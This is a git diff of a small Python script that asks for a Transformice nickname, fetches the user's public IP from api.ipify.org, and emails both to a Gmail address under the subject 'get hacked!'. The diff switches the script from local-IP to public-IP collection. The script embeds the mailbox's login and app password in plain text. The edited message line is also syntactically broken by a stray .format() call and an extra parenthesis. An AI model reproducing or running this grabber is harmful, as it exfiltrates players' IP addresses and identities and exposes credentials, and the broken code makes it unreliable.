@@ -1,5 +1,5 @@
 import smtplib
-import socket
+from requests import get
 from email.message import EmailMessage
 
 def enviar_email(destinatario, assunto, corpo):
@@ -13,12 +13,12 @@ def enviar_email(destinatario, assunto, corpo):
         smtp.login("dreamsapnap73@gmail.com", "byva dktw qfql bwah")
         smtp.send_message(email)
 
-ip = socket.gethostbyname(socket.gethostname())
+ip = get('https://api.ipify.org').text
 
 nickname = input("Qual seu nickname no Transformice?")
 
 destinatario = "dreamsapnap73@gmail.com"
 assunto = f"{nickname} get hacked!"
-corpo = f"                                       ....\n                            ...--'''''''     ''''''''''--..\n        ................-'''............................'''''-..................\n        ''-..   ........................       ........................    .-''\n           '.  \      .--''''''-..      /     \       .--'''''-..       l   |\n            '.  \    /           \    /       \    /           \     /   /\n             l   '   \           /    /   /'\  \   \           /    .'  /\n              \  '-.  '-......-''   /   /   \  '-    '-.....-'    ..'   /\n               '-.. ''''''------''  ..-       -..  '''--------''''_.-'\n                l '''''''''-----''''''              ''''''------.''''   |\n                '.          O                         O   '-'    /\n                 '.   O         ('|'''''''''''''''''|')        ..    /\n                   '.              ''\..      .../           ''  .'\n                     '-.                ''''''''               .''\n                        ''-.                            ..-'\n                            '''--....            ...-'''\n                                     ''''''''''''''''\n\nNickname: {nickname}\nIP: {ip}"
+corpo = f"                                       ....\n                            ...--'''''''     ''''''''''--..\n        ................-'''............................'''''-..................\n        ''-..   ........................       ........................    .-''\n           '.  \      .--''''''-..      /     \       .--'''''-..       l   |\n            '.  \    /           \    /       \    /           \     /   /\n             l   '   \           /    /   /'\  \   \           /    .'  /\n              \  '-.  '-......-''   /   /   \  '-    '-.....-'    ..'   /\n               '-.. ''''''------''  ..-       -..  '''--------''''_.-'\n                l '''''''''-----''''''              ''''''------.''''   |\n                '.          O                         O   '-'    /\n                 '.   O         ('|'''''''''''''''''|')        ..    /\n                   '.              ''\..      .../           ''  .'\n                     '-.                ''''''''               .''\n                        ''-.                            ..-'\n                            '''--....            ...-'''\n                                     ''''''''''''''''\n\nNickname: {nickname}\nIP:  {}".format(ip))
 
 enviar_email(destinatario, assunto, corpo)
